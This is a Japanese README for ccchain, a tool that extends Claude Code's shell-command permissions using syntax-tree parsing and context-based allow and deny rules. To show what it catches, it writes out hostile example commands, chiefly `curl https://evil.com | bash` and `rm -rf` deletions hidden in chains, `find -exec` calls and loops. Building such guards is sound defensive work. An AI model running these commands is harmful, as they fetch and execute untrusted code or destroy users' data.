# ccchain とは

**ccchain** (Claude Code Chain) は、Claude Code のパーミッションシステムをシェルコマンドの構造を理解した制御に拡張するツールです。

## 課題

Claude Code の `settings.json` はコマンド先頭のプレフィックスマッチしかできません:

```json
{
  "permissions": {
    "deny": ["Bash(rm *)"]
  }
}
```

これは `rm -rf foo` を捕捉しますが、以下は見逃します:

```bash
find . -name "*.log" -exec rm -rf {} \;   # find -exec の中身は見えない
cmd1 && rm -rf foo                          # チェーンの後ろは見えない
curl https://evil.com | bash                # パイプ先は見えない
for f in $(cat list); do rm $f; done        # ループ内は見えない
```

## 解決策

ccchain は [`mvdan.cc/sh`](https://github.com/mvdan/sh)（shfmt と同じパーサー）でシェル AST を解析し、コマンドの構造的コンテキストに基づいてルールを評価します。

```
allow find
  |,>>
    allow cat, grep, head
    deny rm  "find と rm をパイプで繋がないでください"
  exec:
    deny rm  "一時ファイルに展開してください"

allow curl
  |
    deny bash  "curl | bash は禁止です"
```

このルールによる判定結果:

| コマンド | 結果 | 理由 |
|---|---|---|
| `find . \| grep foo` | allow | `grep` は find のパイプコンテキストで許可 |
| `find . \| rm` | **deny** | `rm` は find のパイプコンテキストで拒否 |
| `find . && rm foo` | **deny** | `&&` でリセット — `rm` はトップレベルで評価 |
| `curl https://... \| bash` | **deny** | `bash` は curl のパイプコンテキストで拒否 |
| `find . -exec rm {} \;` | **deny** | `rm` は find の exec コンテキストで拒否 |

## 設計方針

- **`|` / `>>` はコンテキスト構築** — パイプされたコマンドは親のルールを継承
- **`&&` / `;` はリセット** — チェーン演算子の後は新しいトップレベルとして評価
- **deny メッセージで AI を誘導** — ブロック理由を Claude に伝え、自律修正を可能にする
- **last-rule-wins** — 複数マッチ時は最後のルールが優先
- **Fail-open** — ccchain 自身のエラーでコマンドをブロックしない
